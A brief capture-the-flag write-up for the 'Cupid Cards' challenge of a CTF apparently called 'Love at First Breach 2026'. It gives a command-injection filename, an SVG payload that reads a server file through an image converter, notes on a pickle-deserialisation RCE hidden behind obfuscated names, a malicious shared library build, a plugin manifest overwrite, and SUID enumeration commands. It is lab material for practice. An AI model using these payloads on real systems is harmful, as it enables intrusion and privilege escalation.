## Love at First Breach 2026 - Advanced Track
### Cupid Cards
# YouTube video walk through: https://youtu.be/k6-5rF1tz_U


```
x;id>cards/id.txt;#.png
```

```<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="1420px" height="1800px" version="1.1"
xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="text:app.py[0]"
x="0" y="0" height="1800px" width="1420px"/>
</svg>
```


```
find / -user aphrodite -readable 2>/dev/null
```

Obfuscated Pickle: In hbproto.py, the variable Φιλία decodes to 'pickle' and Καρδιά decodes to 'loads'.

The Trigger: The function decode_notes calls Αμούρ(Сердце), which translates effectively to pickle.loads(payload).

The Execution Flow:

  - match_engine.py scans /var/spool/heartbreak/inbox/*.love.

    It unpacks the file using msgpack.

    If the dictionary contains a notes field that is bytes, it calls hbproto.decode_notes() on it.

    This triggers the RCE via pickle.
    
```
gcc -shared -fPIC -o evil.so evil.c
```

```
cat > /opt/heartbreak/plugins/manifest.json << 'EOF'
{
  "plugins": {
    "rosepetal": {
      "hash": "c0ced92af1482e47d13d07c2eccc577e5de663e06fcf59ed12cafe4af8602562",
      "description": "Rose petal animation plugin",
      "version": "1.0"
    },
    "loveletter": {
      "hash": "b47a17238fb47b6ef9d0d727453b0335f5bd4614cf415be27516d5a77e5f4643",
      "description": "Love letter formatter plugin",
      "version": "1.0"
    }
  }
}
EOF
```
```
find / -perm -4000 2>/dev/null
```
